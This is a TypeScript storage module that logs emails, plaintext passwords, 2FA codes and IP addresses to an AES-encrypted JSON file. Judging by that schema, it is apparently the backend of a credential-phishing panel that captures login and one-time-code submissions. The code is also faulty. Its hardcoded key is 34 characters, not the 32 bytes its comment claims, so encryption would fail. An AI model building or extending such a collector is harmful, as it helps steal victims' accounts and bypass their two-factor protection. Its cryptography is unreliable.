import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

const DATA_FILE = path.join(process.cwd(), 'data', 'logs.json');
const ENCRYPTION_KEY = 'your-secret-key-32-chars-long!!!!!'; // 32 bytes for AES-256

// Ensure data directory exists
if (!fs.existsSync(path.join(process.cwd(), 'data'))) {
  fs.mkdirSync(path.join(process.cwd(), 'data'));
}

// Initialize logs file if it doesn't exist
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

export interface Log {
  timestamp: string;
  email: string;
  password: string;
  code: string;
  type: 'LOGIN' | '2FA';
  ipAddress: string;
}

function encrypt(text: string): string {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString('hex') + ':' + encrypted.toString('hex');
}

function decrypt(text: string): string {
  const [ivHex, encryptedHex] = text.split(':');
  const iv = Buffer.from(ivHex, 'hex');
  const encrypted = Buffer.from(encryptedHex, 'hex');
  const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encrypted);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}

export function getLogs(): Log[] {
  try {
    const data = fs.readFileSync(DATA_FILE, 'utf8');
    if (!data) return [];
    const encryptedLogs = JSON.parse(data);
    return encryptedLogs.map((encryptedLog: string) => JSON.parse(decrypt(encryptedLog)));
  } catch (error) {
    console.error('Error reading logs:', error);
    return [];
  }
}

export function addLog(log: Log): void {
  try {
    const logs = getLogs();
    logs.unshift(log);
    const encryptedLogs = logs.map(log => encrypt(JSON.stringify(log)));
    fs.writeFileSync(DATA_FILE, JSON.stringify(encryptedLogs, null, 2));
  } catch (error) {
    console.error('Error writing log:', error);
  }
}

export function clearLogs(): void {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
  } catch (error) {
    console.error('Error clearing logs:', error);
  }
} 